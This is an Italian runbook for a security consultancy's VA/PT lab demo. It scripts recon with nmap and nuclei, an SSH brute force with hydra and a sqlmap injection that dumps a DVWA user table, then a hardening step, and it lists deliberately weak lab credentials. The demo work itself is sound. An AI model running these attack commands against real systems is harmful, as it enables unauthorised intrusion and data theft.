# Aubay VA/PT Demo Lab — Runbook della dimostrazione

> **Il copione da seguire in sala.** Comandi pronti da incollare, con la frase
> in "linguaggio-rischio" da dire al partner a ogni passo.
> Durata target: **25-30 min**. Audience: **mista business + tecnico**.
>
> Regola d'oro: **tutto è preparato per avere un esito noto.** Esegui il
> *dry-run* completo (sezione 0) almeno una volta prima della demo vera.

---

## 0. Preparazione (il giorno prima + 30 min prima)

**Il giorno prima**
```bash
make status                     # server running?
make allow-ip IP="<ip-sede>, <tuo-ip>"   # autorizza la sede Aubay
make check-targets              # tutti i target rispondono
make seed-guac                  # connessioni in Guacamole
# OpenVAS: lascialo sincronizzare il feed (docker logs -f vapt-openvas)
make scan PHASE=before          # popola la baseline della dashboard
```

**30 minuti prima**
- Apri nel browser e lascia pronte **tre schede**:
  1. `https://<IP>/guacamole/` → connessione **redteam (Kali)** aperta sul terminale
  2. `https://<IP>/dashboard/` → scheda **Prima**
  3. `https://<IP>/guacamole/` → connessione **ws01 (jdoe)** (per il finale lateral movement)
- Verifica che DVWA sia inizializzato: apri una volta `http://web.corp.local/setup.php` dal Kali (`curl`), oppure dal browser via Guacamole. Login DVWA: `admin`/`password`, security level **low**.
- **Desktop + posta (una tantum):** apri la connessione **Desktop utente** in Guacamole. Thunderbird si avvia da solo; al primo lancio chiede la password della casella → inserisci **`Password1`** e spunta *ricorda password*. Resta salvata (volume persistente), non te la richiede più. Verifica che si vedano le 3 mail di `jdoe`.
- `make restore` per assicurarti che il proxy parta dallo stato **vulnerabile**.
- Ingrandisci il font del terminale (leggibilità in sala).

**Reset tra una demo e l'altra:** `make restore && make scan PHASE=before`.

---

## 1. Apertura — "Infrastruttura come codice" (2 min)

**Dì:** *"Tutto quello che vedete nasce da codice. Posso creare o distruggere
l'intero ambiente in pochi minuti, zero lock-in. Questo è già un modo di lavorare:
ripetibile, versionato, consegnabile."*

Mostra al volo la struttura del repo (o un `make help`). Non serve eseguire nulla.

---

## 2. Lo scenario (2 min)

**Dì:** *"Simuliamo un cliente tipo: tre aree. Un datacenter con sito web, posta e
un proxy di frontiera; le postazioni dei dipendenti; e la nostra postazione di
security. Facciamo quello che fareste chiedere a un fornitore: prima fotografiamo
il rischio, poi dimostriamo che è reale."*

Mostra la topologia (diagramma in `docs/ARCHITECTURE.md`).

**Walk-through visivo (opzionale, 2-3 min, per il pubblico non tecnico).**
Apri la connessione **Desktop utente** in Guacamole: è la postazione di un dipendente.
Dalla pagina di lancio apri il **Portale Web** e lo **Shop**; poi mostra **Thunderbird**
con la posta aziendale. **Dì:** *"Questo è ciò che vede un dipendente ogni giorno. Ora
vediamo cosa vede un attaccante."* Nota la mail "Accesso server condiviso": contiene
credenziali in chiaro — un gancio perfetto per il tema che segue.

---

## 3. VA — la fotografia del rischio (6-8 min)

Dal terminale **redteam (Kali)**:

```bash
# Ricognizione: cosa è esposto
nmap -sV --top-ports 50 web.corp.local proxy.corp.local mail.corp.local
```
**Dì:** *"In pochi secondi so quali servizi corrono e in che versione. È il punto
di partenza di ogni valutazione."*

```bash
# Scanner rapido open source
nuclei -u http://proxy.corp.local -silent
```
**Dì:** *"Nuclei confronta gli asset contro migliaia di controlli noti. Qui vedete
header di sicurezza mancanti, versione del server esposta: debolezze concrete."*

Ora passa alla **dashboard** (scheda *Prima*):

**Dì:** *"Questo è ciò che il vostro cliente capisce: non una lista tecnica, ma un
numero e una severità. Tot vulnerabilità, così distribuite. Questo è il rischio,
quantificato."*

> Nota: la baseline l'hai già generata con `make scan PHASE=before`. Se vuoi
> rigenerarla live: `make scan PHASE=before` da un secondo terminale.

**Sull'enterprise (talking point, senza aspettare):** *"In parallelo gira OpenVAS,
uno scanner enterprise-grade, per un assessment completo. Lo strumento rapido serve
in sala; quello pesante produce il report formale."*

---

## 4. PT — dal rischio teorico all'impatto reale (10 min)

Il cuore. Dal terminale **redteam (Kali)**.

**4a. Brute force di una credenziale debole**
```bash
hydra -L /opt/wordlists/users.txt -P /opt/wordlists/passwords.txt ws01.corp.local ssh -t 4
```
**Dì:** *"Una password debole non è un'ipotesi. Provo le combinazioni comuni e… la
postazione di un dipendente si apre."* → esce `jdoe:Password1`.

**4b. SQL injection con esfiltrazione dati (il momento più forte)**
```bash
# Prendo un cookie di sessione DVWA (già inizializzato, security=low)
sqlmap -u "http://web.corp.local/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=$(curl -s -c - -d 'username=admin&password=password&Login=Login' \
  http://web.corp.local/login.php | grep PHPSESSID | awk '{print $7}')" \
  --batch --dump -T users -D dvwa
```
**Dì:** *"Qui non parliamo più di un header mancante. Sto estraendo l'intera tabella
utenti con le password. Questo è l'impatto di business: un dato che esce."*

> Se il one-liner del cookie dà problemi in sala, ripiego pronto: fai login su DVWA
> dal browser (Guacamole), copia il `PHPSESSID` dagli strumenti sviluppatore e
> incollalo nel comando. Prova entrambi nel dry-run e tieni il più affidabile.

**4c. (Opzionale) Web app moderna**
Apri **Juice Shop** (`http://juice.corp.local:3000`) dal browser:
**Dì:** *"Stesso approccio su un'applicazione moderna, SPA e API: la superficie
cambia, il metodo no."*

---

## 5. Remediation / Blue team — "non solo troviamo, risolviamo" (4 min)

**Dì:** *"Trovare non basta. Ecco la differenza di un partner tecnico."*

Applica l'hardening e ri-scansiona (da un terminale sul tuo PC):
```bash
make harden              # security header + versione nascosta sul proxy
make scan PHASE=after     # ri-scansione
```
Passa alla **dashboard**, scheda **Dopo remediation**:

**Dì:** *"Stesso ambiente, dopo l'intervento. Le vulnerabilità del proxy sono
rientrate, l'indice di rischio è sceso. E l'abbiamo verificato con una nuova
scansione, non a parole."*

---

## 6. Chiusura — il pitch (2 min)

**Dì:** *"Tutto questo con soli strumenti open source. È così che costruiamo e
manteniamo competenza interna, in modo vendor-agnostic. Sul vostro progetto reale
scegliamo insieme il prodotto commerciale giusto per il contesto, oppure
integriamo e valorizziamo quello che il cliente ha già. Noi portiamo il saper
fare."*

---

## Appendice — Comandi di emergenza

| Situazione | Comando |
|---|---|
| Rientrare dopo cambio IP | `make my-ip` poi `make allow-ip IP=...` |
| Un container è giù | `make ssh` → `docker ps -a` → `docker start <nome>` |
| Reset completo demo | `make restore && make scan PHASE=before` |
| Dashboard vuota | ri-lancia `make scan PHASE=before` |
| OpenVAS non pronto | normale se il feed non è finito: la demo usa Nuclei |
| Ricreare tutto da zero | `make deploy` |

## Appendice — Credenziali del lab

| Dove | Utente | Password |
|---|---|---|
| Guacamole | guacadmin | (quella che hai impostato) |
| DVWA | admin | password |
| ws01 (SSH) | jdoe | Password1 |
| ws01 (SSH) | deploy | deploy |
| ws02 (SSH) | mrossi | qwerty |
| ws02 (SSH) | svc | service |
| OpenVAS | admin | LabOpenVAS-2026 |
| Posta IMAP (Thunderbird) | jdoe | Password1 |
| Desktop VNC (via Guacamole) | — | demo |

> Credenziali deboli **volute**: sono i bersagli della dimostrazione. Ambiente da
> usare **solo** nel lab isolato.
